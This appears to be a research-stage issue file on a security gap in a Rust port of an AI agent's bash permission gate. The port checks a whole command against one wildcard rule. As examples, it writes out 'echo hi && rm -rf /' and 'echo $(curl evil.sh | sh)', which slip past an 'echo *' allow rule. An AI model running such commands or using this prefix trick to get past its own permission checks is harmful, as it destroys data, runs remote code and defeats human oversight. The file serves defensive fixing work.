---
stage: new
status: done
updated: 2026-08-22 23:05
---

# Port the bash command enumerator (chain + nested-execution units)

> **Upstream parity gap.** `cyrup-permission-system` is a port of `pi-permission-system` **v0.8.0**;
> upstream is now **v27.0.0** (2026-08-21, 27 major releases later) and lives at
> [`gotgenes/pi-packages`](https://github.com/gotgenes/pi-packages) — the standalone repo the port
> cites is archived at v5.18.1. Reference checkout: `./tmp/pi-packages/packages/pi-permission-system`.
> Full backlog and ordering: [UPSTREAM_PARITY_INDEX.md](./UPSTREAM_PARITY_INDEX.md).


| | |
| --- | --- |
| **Severity** | critical |
| **Kind** | absent |
| **Upstream area** | access intent: bash parsing |
| **Verification** | Confirmed by an adversarial re-check that tried and failed to refute it |

## What upstream does that the port does not

Upstream parses a bash invocation with tree-sitter, enumerates every command unit (chain operands,
command/process substitutions, subshells) and resolves the most-restrictive result across them;
the port matches the whole command string against one wildcard rule.

## Evidence

**Upstream** (`tmp/pi-packages/packages/pi-permission-system`):

src/access-intent/bash/command-enumeration.ts:96-141 (collectCommands: descends
program/list/pipeline/redirected_statement, emits each `command` node, descends substitutions and
subshells); src/access-intent/bash/program.ts:102 (BashProgram.commands());
src/handlers/gates/bash-command.ts:57-104 (resolveBashCommandCheck: resolves EACH unit on the
`bash` surface, pickMostRestrictive, and fails closed to `<unparseable-bash-command>` ask on a
zero-unit parse of a non-empty command)

**Port** (`crates/cyrup-permission-system`):

crates/cyrup-permission-system/src/manager.rs:221-243 — the whole `input.command` string is fed to
`find_compiled_match(&resolved.compiled_bash, &command)`, no decomposition. Negative greps over
/home/user/cyrup/crates/cyrup-permission-system/src (excluding tests): `rg -n
"tree.?sitter|tree_sitter" .` → 0 matches; `rg -n
"collect_commands|command_substitution|process_substitution|subshell" .` → 0 matches.

## Why it matters

An `allow` rule on a leading command grants the whole chain. `wildcard.rs:60-68` compiles `echo *`
to the anchored dotAll regex `^echo .*$`, so `echo hi && rm -rf /` and `echo $(curl evil.sh | sh)`
both match an `echo *` allow and execute ungated. This is upstream issue #301/#306 re-opened:
every deny rule on a bash sub-command is bypassable by prefixing an allowed command.

## Notes from the verification pass

These corrections and caveats come from the agent that tried to refute the finding —
read them before trusting the framing above.

Could not refute. src/manager.rs:221-243 is the entire bash arm: `to_record(input).get("command")`
-> `find_compiled_match(&resolved.compiled_bash, &command)` on the raw whole string, one match, no
decomposition. Cargo.toml (/home/user/cyrup/crates/cyrup-permission-system/Cargo.toml:24-62) has
NO tree-sitter dependency at all — only `regex` (declared solely for wildcard.rs's dotAll flag),
so no parser exists to build on. Confirmed negatives over src/ excluding tests: `rg -ni
"collect_commands|command_substitution|process_substitution|subshell|enumerat"` -> only unrelated
`.enumerate()` iterator calls (ext_config.rs:612,629; gate.rs:480) and registry-enumeration prose
in extension/decide.rs:81 / agent_start.rs:25; `rg -ni "most_restrictive|pick_most|restrictive"`
-> only forwarding.rs's `set_restrictive_mode` (file chmod, unrelated); `rg -n
'"&&"|pipeline|operand'` -> 0 relevant. Upstream evidence verified: src/access-
intent/bash/command-enumeration.ts:96-141 (collectCommands/collectCommandsInto,
EXECUTION_HOST_TYPES, subshell descent) and src/handlers/gates/bash-command.ts:55-104 (per-unit
resolve on the `bash` surface, pickMostRestrictive, `<unparseable-bash-command>` fail-closed ask).
No CYRUP-DELTA anywhere claims this divergence — the 27 CYRUP-DELTA markers in the crate cover
runtime_api Weak handles, logging, surrogate truncation, event shapes, channel names; none touch
bash decomposition. Severity confirmed critical: wildcard.rs:96-113 compiles `echo *` to `^echo
.*$` with `dot_matches_new_line(true)` (wildcard.rs:107), so `echo hi && rm -rf /` matches the
allow, and every bash deny rule is evadable by prefixing an allowed command.

## Acceptance Criteria

- [ ] The capability above is implemented in `crates/cyrup-permission-system`, matching the
      cited upstream behaviour
- [ ] The implementation's doc comments cite the upstream source the way the rest of the crate
      does (`file.ts:line`), so the next parity sweep can find it
- [ ] A deliberate divergence, if any, is marked `\[CYRUP-DELTA]` with its reasoning
- [ ] `cargo check -p cyrup-permission-system --all-targets` and `cargo clippy --all-targets` clean
- [ ] The existing suite still passes

> Run `/ask` or `/aug` on this file before `/exec` — it is a research-stage finding, not a plan.
